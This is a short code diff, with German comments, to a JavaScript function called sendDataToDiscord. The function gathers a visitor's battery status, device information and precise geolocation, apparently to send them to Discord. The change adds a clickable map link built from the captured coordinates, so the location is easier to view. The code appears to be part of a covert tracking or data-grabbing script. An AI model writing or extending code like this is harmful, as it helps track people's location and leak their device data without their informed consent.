@@ -25,12 +25,16 @@ async function sendDataToDiscord() {
 
         // Geolocation abfragen
         let locationInfo = 'Geolocation konnte nicht abgefragt werden';
+        let geolocationLink = '';
         if ('geolocation' in navigator) {
             locationInfo = new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const { latitude, longitude } = position.coords;
                         resolve(`Breitengrad: ${latitude}, Längengrad: ${longitude}`);
+                        
+                        // Erstelle den Link für die Geolocation
+                        geolocationLink = `https://www.koordinaten-umrechner.de/decimal/${latitude},${longitude}?karte=OpenStreetMap&zoom=9`;
                     },
                     (error) => {
                         resolve(`Fehler beim Abrufen der Geolocation: ${error.message}`);
@@ -51,6 +55,7 @@ async function sendDataToDiscord() {
                      `Batteriestatus: ${batteryStatus}\n` +
                      `Device-Informationen: ${deviceInfo}\n` +
                      `Geolocation: ${locationInfo}\n` +
+                     `Geolocation-Link: [Hier ansehen](${geolocationLink})\n` +
                      `[Mehr Informationen](${moreInfoLink})`
         };
 
